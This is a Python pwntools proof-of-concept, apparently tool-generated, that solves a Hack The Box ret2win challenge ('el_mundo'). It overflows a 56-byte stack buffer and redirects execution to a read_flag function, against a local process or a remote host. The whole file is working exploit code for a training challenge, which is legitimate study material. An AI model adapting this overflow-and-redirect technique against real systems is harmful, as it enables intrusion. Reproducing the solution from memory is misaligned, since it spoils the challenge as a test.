#!/usr/bin/env python3
# Argus-generated ret2win PoC scaffold
# Chain: chains.ret2win_rop_chain
# Binary: /mnt/d/Repos/Security/Argus/vulntest/validation/htb/tracks/binary_exploitation/extracted/a12c7359-6c52-485c-a48b-caa2fe6b7fce/challenge/el_mundo
from pwn import *

context.arch = 'amd64'
context.log_level = 'warning'

fname = '/mnt/d/Repos/Security/Argus/vulntest/validation/htb/tracks/binary_exploitation/extracted/a12c7359-6c52-485c-a48b-caa2fe6b7fce/challenge/el_mundo'

OVERFLOW_OFFSET = 56  # buf_frame_offset (Binja initial-RSP-relative)

def exploit(target):
    elf = ELF(fname, checksec=False)
    win = 0x4016b7  # read_flag
    rop     = ROP(elf)
    ret     = rop.find_gadget(['ret'])[0]

    chain  = b'A' * OVERFLOW_OFFSET
    chain += p64(ret)  # SSE 16-byte stack alignment
    chain += p64(win)  # read_flag

    target.sendlineafter(b'>> ', chain)
    return target.recvall(timeout=3)

if __name__ == '__main__':
    import sys
    if len(sys.argv) >= 3:
        r = remote(sys.argv[1], int(sys.argv[2]))
    else:
        r = process(fname)
    out = exploit(r)
    flag = [l for l in out.decode(errors='replace').splitlines() if 'HTB' in l or 'flag' in l.lower()]
    print(flag[0] if flag else out[:200])
